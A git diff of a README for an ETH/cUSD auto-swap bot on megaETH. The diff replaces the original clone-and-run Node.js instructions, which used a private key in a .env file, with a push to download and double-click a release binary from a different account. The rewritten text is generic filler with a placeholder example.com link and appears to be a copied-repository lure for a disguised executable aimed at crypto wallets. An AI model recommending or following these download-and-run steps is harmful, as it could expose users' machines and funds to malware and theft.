@@ -1,83 +1,91 @@
-# 🔄 Auto Swap Bot (ETH ↔ cUSD) dex GTE on network megaETH
+# 🤖 auto-swap-megaETH-dex-GTE - Your Swap Bot for Easy Trading
 
-<img width="1280" height="559" alt="image" src="https://github.com/user-attachments/assets/664ed1c4-b597-480a-a6f3-c02ec46c9d60" />
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/releases)
 
----
+## 🚀 Getting Started
 
-## 🚀 Features
-- Randomized daily swaps (number of transactions, amount per swap, and delay between swaps).
-- Configurable RPC endpoint, wallet private key, and all randomization ranges via `.env`.
-- Supports EIP-1559 transactions (`maxFeePerGas` & `maxPriorityFeePerGas`).
-- Logs each swap with timestamp and transaction hash.
-- Loop runs continuously every days once started.
+Welcome to auto-swap-megaETH-dex-GTE! This tool automates the process of swapping ETH and cUSD on megaETH. It’s designed to make your trading experience simple and efficient without requiring technical skills.
 
----
+## 🛠️ System Requirements
 
-## 📦 Installation
-Clone the repository and install dependencies:
+To run the auto-swap megaETH dex bot, you will need:
 
-```bash
-git clone https://github.com/abahuto/auto-swap-megaETH-dex-GTE.git
-```
-```bash
-cd auto-swap-megaETH-dex-GTE
-```
-```bash
-npm install
-```
+- An internet connection
+- A device (PC or Mac) with Windows or MacOS
+- At least 200 MB of free disk space
+- A crypto wallet that supports ETH and cUSD
 
-## ⚙️ Environment Setup
-Create a .env file in the project root:
-```bash
-nano .env
-```
-Fill in your wallet details and randomization settings:
-```bash
-# RPC endpoint
-RPC_URL=https://carrot.megaeth.com/rpc
+## 📥 Download & Install
 
-# Private key (without quotes)
-PRIVATE_KEY=your_private_key
+To get started, follow these steps:
 
-# Wallet address
-ADDRESS=your_address
+1. **Visit this page to download**: [auto-swap-megaETH-dex-GTE Releases](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/releases).
+2. Select the latest release version.
+3. Download the appropriate file for your operating system (Windows or MacOS).
+4. Once downloaded, double-click the file to install the application.
 
-# Contract addresses
-ROUTER_ADDRESS=0xa6b579684e943f7d00d616a48cf99b5147fc57a5
-WETH_ADDRESS=0x776401b9bc8aae31a685731b7147d4445fd9fb19
-CUSD_ADDRESS=0xe9b6e75c243b6100ffcb1c66e8f78f96feea727f
+## ⚙️ Configuration
 
-# Random swap amounts (ETH → cUSD)
-MIN_ETH=0.000001
-MAX_ETH=0.00001
+Before you start swapping, you need to configure the application. Follow these steps:
 
-# Random swap amounts (cUSD → ETH)
-MIN_CUSD=10
-MAX_CUSD=20
+1. Locate the `.env` file in the installation directory.
+2. Open the file with a text editor like Notepad (Windows) or TextEdit (Mac).
+3. Fill in your wallet details and any other necessary settings. 
+   
+   Example configuration items may include:
+   - Your wallet address
+   - Transaction limits
+   - Logging preferences
 
-# Random number of transactions per day
-MIN_TX=34
-MAX_TX=56
+4. Save the changes to the file. 
 
-# Random delay between swaps (in seconds)
-MIN_DELAY=60
-MAX_DELAY=120
-```
+## 🔄 How to Use the Bot
 
-## ▶️ Running the Bot
-To start the bot:
-```bash
-node index.js
-```
-What the bot does:
+With the application installed and configured, you're ready to start swapping. Here’s how:
 
-- Randomly decides between ETH → cUSD or cUSD → ETH swap each time.
+1. Open the auto-swap application from your desktop or applications folder.
+2. Click on the "Start" button to begin the swapping process.
+3. Monitor the detailed logs for each swap, which will show you the transaction details.
 
-- Executes a random number of swaps daily (within your configured range).
+### 📝 Features
 
-- Randomizes swap amount and delay between each transaction.
+- **Automated Swaps**: Set daily swaps that occur automatically.
+- **EIP-1559 Support**: Benefit from efficient transactions.
+- **Detailed Logging**: Keep track of all swaps for easy auditing.
+- **Flexible Configuration**: Adjust settings through the .env file to suit your needs.
 
-- Signs and sends transactions using your private key.
+## 📊 Advanced Usage
 
-## 🔖 Tags
-#eth #cusd #swap #bot #crypto #web3 #automation #trading #dex #evm #airdrop #megaETH #GTE
+For users who want more control, consider these advanced features:
+
+- **Randomized Daily Swaps**: Configure the time of swaps so that they are not predictable. This can help in trading strategies.
+- **Testing Mode**: Use a test wallet to ensure everything works before trading with real funds.
+- **Airdrop Farming**: Utilize the bot to help manage airdrop opportunities.
+
+## ❓ FAQs
+
+### How do I troubleshoot common issues?
+
+If you encounter any problems, check the following:
+
+- Ensure your wallet is properly connected and funded.
+- Verify your internet connection.
+- Look over the logs for error messages that can guide your troubleshooting.
+
+### Can I contribute to this project?
+
+Absolutely! We welcome contributions. Please check our issues on GitHub for any areas where help is needed.
+
+### Where can I find help?
+
+If you need further assistance, visit our [GitHub Discussions](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/discussions) page or create an issue on the GitHub repository.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE)
+- [Community Forums](https://community.example.com)
+- [User Manual](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/wiki)
+
+## 📈 Conclusion
+
+auto-swap-megaETH-dex-GTE simplifies the process of swapping ETH and cUSD. With its user-friendly features and automation, it helps you navigate the world of cryptocurrency trading with ease. For support, updates, and more, regularly visit our Releases page: [auto-swap-megaETH-dex-GTE Releases](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/releases). Always stay safe and happy trading!
